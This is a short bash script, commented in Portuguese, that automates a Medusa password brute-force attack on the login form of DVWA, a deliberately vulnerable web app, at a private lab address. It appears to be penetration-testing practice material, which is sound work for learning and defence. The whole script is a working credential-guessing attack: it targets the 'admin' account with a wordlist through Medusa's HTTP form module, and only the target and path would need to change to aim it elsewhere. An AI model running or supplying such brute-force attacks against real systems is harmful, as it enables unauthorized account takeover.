#!/bin/bash
# Ataque automatizado em formulário web (DVWA) com Medusa

TARGET="192.168.56.102"
USERNAME="admin"
WORDLIST="../wordlists/web.txt"
FORM_PATH="/dvwa/login.php"

echo "[*] Iniciando ataque HTTP contra DVWA em $TARGET..."
medusa -h $TARGET -u $USERNAME -P $WORDLIST -M http -m FORM:$FORM_PATH
